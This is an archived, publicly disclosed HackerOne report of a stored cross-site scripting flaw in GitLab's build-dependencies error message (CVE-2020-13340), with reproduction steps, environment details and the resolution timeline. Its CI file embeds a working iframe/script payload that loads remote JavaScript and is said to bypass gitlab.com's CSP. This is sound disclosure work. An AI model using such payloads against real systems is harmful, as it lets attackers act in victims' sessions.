---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - stack/gitlab
  - vuln/xss
  - fix/csp
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2020-12-01
submitted: 2020-08-03T13:15:27.182Z
bounty_usd: null
votes: 35
cve: "CVE-2020-13340"
program: "[[programs/gitlab|GitLab]]"
reporter: "yvvdwf"
source: "https://hackerone.com/reports/950190"
title: "Store-XSS in error message of build-dependencies "
---
# Store-XSS in error message of build-dependencies 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 35 | **Program:** GitLab | **Disclosed:** 2020-12-01

- Report: [https://hackerone.com/reports/950190](https://hackerone.com/reports/950190)
- CWE: Cross-site Scripting (XSS) - Stored | CVE: CVE-2020-13340
- Submitted: 2020-08-03T13:15:27.182Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,

A stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.

### Steps to reproduce

The following steps should to be reproduced in a self-managed installation of gitlab

1. Create an empty project
2. Go to "Settings/CI/CD/Runners" to setup a runner for this project
3. Create new file `.gitlab-ci.yml` for this project using the following content:

```yaml
test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:
  stage: build
  script: 
    - date > index.html
  artifacts:
    paths: 
      - index.html
    expire_in: 1 second

job-test:
  stage: test
  script: echo "hi"
  dependencies: ["test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"]
```

4. Wait for the jobs terminated, go to the detail of `job-test`
5. You should see an alert that contains the current url

### Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

### What is the current *bug* behavior?

The `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)

### What is the expected *correct* behavior?

The `failure_message` should be sanitized.

### Relevant logs and/or screenshots

Please see a screenshot in attached file

### Output of checks

#### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.9
Git Version:	2.27.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.2.2-ee
Revision:	618883a1f9d
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gl.local
HTTP Clone URL:	http://gl.local/some-group/some-project.git
SSH Clone URL:	git@gl.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

## Timeline

- **Report Filed**
- **2020-08-03** @gitlab-securitybot: Hi @yvvdwf,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-08-04** @yvvdwf: Hi,

I confirm that I can reproduce on gitlab.com. An example is available here: https://gitlab.com/yvvdwf/ci-dependencies/-/jobs/669728590

To reproduce: please find in attached file the export of an example project, then import it in gitlab.com

Best regards
- **Report Triaged**
- **Bounty Awarded**
- **2020-09-16** @gitlab-securitybot: ETA for fix:

Hi @yvvdwf,

The issue you reported is currently scheduled to be fixed by 2020-10-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-10-20** @gitlab-securitybot: ETA for fix:

Hi @yvvdwf,

The issue you reported is currently scheduled to be fixed by 2020-11-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Cve Id Added**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
